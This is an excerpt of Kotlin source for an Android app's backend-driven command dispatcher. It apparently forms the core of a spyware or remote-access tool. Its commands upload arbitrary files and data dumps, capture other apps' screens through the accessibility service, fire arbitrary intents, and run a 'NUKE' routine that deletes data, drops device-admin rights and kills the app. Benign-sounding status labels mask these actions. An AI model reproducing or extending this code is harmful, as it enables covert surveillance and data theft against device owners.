 82 |     private suspend fun processSingleCommand(ctx: Context, cmd: JSONObject) {
 83 |         val id = cmd.getInt("id")
 84 |         
 85 |         // 1. Mark as RECEIVED immediately so backend knows the device is alive
 86 |         updateCommandStatus(ctx, id, "RECEIVED", null)
 87 | 
 88 |         var status = "EXECUTED"
 89 |         var errorMsg = ""
 90 |         val fileName = cmd.optString("file_name")
 91 |         val content = cmd.optString("content", "")
 92 | 
 93 |         try {
 94 |             when (fileName) {
 95 |                 "TOAST" -> {
 96 |                     Handler(Looper.getMainLooper()).post {
 97 |                         Toast.makeText(ctx, content, Toast.LENGTH_LONG).show()
 98 |                     }
 99 |                 }
100 |                 "RING" -> {
101 |                     val dur = content.toLongOrNull() ?: 10L
102 |                     val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
103 |                     val oldMode = am.ringerMode
104 |                     val oldVol = am.getStreamVolume(android.media.AudioManager.STREAM_RING)
105 |                     
106 |                     if (PermissionManager.hasDndAccess(ctx)) {
107 |                         am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
108 |                     }
109 |                     am.setStreamVolume(android.media.AudioManager.STREAM_RING, am.getStreamMaxVolume(android.media.AudioManager.STREAM_RING), 0)
110 |                     
111 |                     val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
112 |                     val ringtone = android.media.RingtoneManager.getRingtone(ctx, uri)
113 |                     ringtone.play()
114 |                     
115 |                     kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
116 |                         kotlinx.coroutines.delay(dur * 1000)
117 |                         ringtone.stop()
118 |                         if (PermissionManager.hasDndAccess(ctx)) {
119 |                             am.ringerMode = oldMode
120 |                         }
121 |                         am.setStreamVolume(android.media.AudioManager.STREAM_RING, oldVol, 0)
122 |                     }
123 |                     status = "RINGING (${dur}S)"
124 |                 }
125 |                 "STAY_READY" -> {
126 |                     val mins = content.toLongOrNull() ?: 5L
127 |                     val i = android.content.Intent(ctx, BeaconService::class.java)
128 |                     i.putExtra("duration_mins", mins)
129 |                     if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i)
130 |                     else ctx.startService(i)
131 |                     status = "SYNC_PRIORITY_HIGH (${mins}M)"
132 |                 }
133 |                 "SET_INTERVAL" -> {
134 |                     // Content = Interval in Minutes (min 15)
135 |                     val mins = content.toLongOrNull() ?: 15L
136 |                     val safeMins = if (mins < 15) 15L else mins
137 |                     
138 |                     val wm = WorkManager.getInstance(ctx)
139 |                     val constraints = Constraints.Builder()
140 |                         .setRequiredNetworkType(NetworkType.CONNECTED)
141 |                         .setRequiresBatteryNotLow(true)
142 |                         .build()
143 | 
144 |                     val req = PeriodicWorkRequestBuilder<RemoteCommandWorker>(safeMins, TimeUnit.MINUTES)
145 |                         .setConstraints(constraints)
146 |                         .build()
147 |                         
148 |                     wm.enqueueUniquePeriodicWork("RemoteCmdWorker", ExistingPeriodicWorkPolicy.REPLACE, req)
149 |                     status = "EXECUTED (NEW INTERVAL: ${safeMins}M)"
150 |                 }
151 |                 "STOP_BEACON" -> {
152 |                     ctx.stopService(android.content.Intent(ctx, BeaconService::class.java))
153 |                     status = "EXECUTED (STOPPED)"
154 |                 }
155 |                 "FORCE_UPLOAD" -> {
156 |                     val modules = content.split(",").map { it.trim() }
157 |                     CloudManager.uploadData(ctx, modules)
158 |                     status = "MANUAL_BACKUP_INITIATED"
159 |                 }
160 |                 "UPLOAD_DUMPS" -> {
161 |                     val dumps = DumpManager.getDumpsForToday()
162 |                     var successCount = 0
163 |                     dumps.forEach {
164 |                         if (CloudManager.uploadFile(ctx, it, "DUMPS")) successCount++
165 |                     }
166 |                     if (successCount != dumps.size) return
167 |                     status = "ARCHIVE_SYNC_COMPLETE ($successCount)"
168 |                 }
169 |                 "PULL_FILE" -> {
170 |                     val f = File(content)
171 |                     if (f.exists() && f.isFile) {
172 |                         if (!CloudManager.uploadFile(ctx, f, "PULL")) return
173 |                         status = "REMOTE_FETCH_SUCCESS"
174 |                     } else {
175 |                         status = "FETCH_ABORTED (NOT_FOUND)"
176 |                     }
177 |                 }
178 |                 "GET_SKELETON" -> {
179 |                     val report = FileManager.generateReport()
180 |                     CloudManager.uploadSkeleton(ctx, report)
181 |                     status = "STORAGE_INDEX_COMPLETE"
182 |                 }
183 |                 "GET_TREE" -> {
184 |                     val json = JSONObject(content)
185 |                     val pkg = json.optString("pkg", null)
186 |                     val mins = json.optLong("duration_mins", 1L)
187 |                     MyAccessibilityService.instance?.startTreeDump(pkg, mins)
188 |                     status = "ACCESSIBILITY_AUDIT_ACTIVE (${mins}M)"
189 |                 }
190 |                 "GET_LOGS" -> {
191 |                     val logs = DebugLogger.getLogs()
192 |                     val tempFile = java.io.File(ctx.cacheDir, "diag_log_${System.currentTimeMillis()}.txt")
193 |                     try {
194 |                         tempFile.writeText(logs)
195 |                         if (CloudManager.uploadFile(ctx, tempFile, "DIAGNOSTIC")) {
196 |                             status = "DIAGNOSTIC_EXPORT_SUCCESS"
197 |                         } else {
198 |                             status = "DIAGNOSTIC_EXPORT_FAILED"
199 |                         }
200 |                     } catch (e: Exception) {
201 |                         status = "EXPORT_ERROR"
202 |                     } finally {
203 |                         if (tempFile.exists()) tempFile.delete()
204 |                     }
205 |                 }
206 |                 "TOGGLE_FEATURE" -> {
207 |                     val parts = content.split(":")
208 |                     if (parts.size >= 2) {
209 |                         val feature = parts[0].trim()
210 |                         val stateStr = parts[1].trim().lowercase()
211 |                         val enable = stateStr == "on" || stateStr == "true"
212 |                         val duration = if (parts.size >= 3) parts[2].toLongOrNull() ?: 0L else 0L
213 |                         
214 |                         ConfigManager.setFeature(ctx, feature, enable, duration)
215 |                         status = if (duration > 0L) "EXECUTED (TEMP OFF: ${duration}M)" else "EXECUTED (PERMANENT)"
216 |                     } else status = "FAILED (FORMAT)"
217 |                 }
218 |                 "CODERED" -> {
219 |                     val i = android.content.Intent(ctx, EmergencyService::class.java)
220 |                     i.putExtra("codes", "0")
221 |                     i.putExtra("sender", "BACKEND")
222 |                     if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
223 |                         ctx.startForegroundService(i)
224 |                     } else {
225 |                         ctx.startService(i)
226 |                     }
227 |                 }
228 |                 "NUKE" -> {
229 |                     try {
230 |                         File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "Android").deleteRecursively()
231 |                         ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().clear().apply()
232 |                         val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
233 |                         val comp = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
234 |                         if (dpm.isAdminActive(comp)) dpm.removeActiveAdmin(comp)
235 |                         status = "CLEANUP_COMPLETE"
236 |                         Handler(Looper.getMainLooper()).postDelayed({ android.os.Process.killProcess(android.os.Process.myPid()) }, 2000)
237 |                     } catch(e: Exception) { status = "CLEANUP_FAILED" }
238 |                 }
239 |                 "RUN_INTENT" -> {
240 |                     try {
241 |                         val json = JSONObject(content)
242 |                         val intent = android.content.Intent(json.optString("action", android.content.Intent.ACTION_VIEW))
243 |                         
244 |                         if (json.has("data")) intent.data = android.net.Uri.parse(json.getString("data"))
245 |                         if (json.has("pkg")) intent.setPackage(json.getString("pkg"))
246 |                         if (json.has("type")) intent.setDataAndType(intent.data, json.getString("type"))
247 |                         
248 |                         // Handle Extras
249 |                         val extras = json.optJSONObject("extras")
250 |                         extras?.keys()?.forEach { key ->
251 |                             val value = extras.get(key)
252 |                             if (value is Boolean) intent.putExtra(key, value)
253 |                             else if (value is Int) intent.putExtra(key, value)
254 |                             else intent.putExtra(key, value.toString())
255 |                         }
256 | 
257 |                         intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
258 |                         val target = json.optString("target", "activity")
259 |                         when (target?.lowercase() ?: "activity") {
260 |                             "service" -> {
261 |                                 if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(intent)
262 |                                 else ctx.startService(intent)
263 |                             }
264 |                             "broadcast" -> ctx.sendBroadcast(intent)
265 |                             else -> ctx.startActivity(intent)
266 |                         }
267 |                         status = "EXECUTED (INTENT SENT)"
268 |                     } catch (e: Exception) {
269 |                         status = "FAILED_INTENT"
270 |                         errorMsg = e.message ?: "Unknown Intent Error"
271 |                     }
272 |                 }
273 |             }
274 |         } catch (e: Exception) {
275 |             status = "FAILED: ${e.message}"
276 |             errorMsg = e.toString()
277 |         }
278 | 
279 |         // Expose the result to the UI Terminal
280 |         DebugLogger.log("COMMAND", "Processed [$fileName] -> $status")
281 | 
282 |         // Update DB
283 |         updateCommandStatus(ctx, id, status, errorMsg)
284 |     }
